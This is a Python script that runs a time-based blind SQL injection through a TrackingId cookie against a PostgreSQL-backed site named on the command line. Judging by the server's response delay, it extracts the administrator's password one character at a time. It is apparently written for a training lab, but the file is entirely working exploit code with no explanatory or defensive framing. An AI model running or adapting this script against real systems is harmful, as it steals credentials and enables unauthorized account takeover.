import requests, sys, time
import string

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'

# Function to send the payload and time the delay
def test_cookie(cookie_string):
    cookie_data = {
        'TrackingId': cookie_string
    }
    resp = requests.get(url, cookies=cookie_data)
    return resp.elapsed.total_seconds()

# Step 1: Confirm injection still works
print("[*] Confirming injection works...")
print(test_cookie("x"))
print(test_cookie("x' || pg_sleep(3) -- "))

# Step 2: Define valid characters
charset = string.ascii_lowercase + string.digits
password = ""
start_time = time.perf_counter()

print("\n[*] Starting linear brute-force password extraction...\n")

while True:
    found = False
    for char in charset:
        candidate = password + char
        payload = f"""x'%3Bselect case when (username='administrator' and password ~ '^{candidate}') then pg_sleep(3) else pg_sleep(0) end from users--"""
        elapsed = test_cookie(payload)
        print(candidate)

        if elapsed > 3:
            password = candidate
            found = True
            break
    if not found:
        break

end_time = time.perf_counter()
print(f"\nDone. Found {password}")
print(f"Time elapsed is {end_time - start_time}")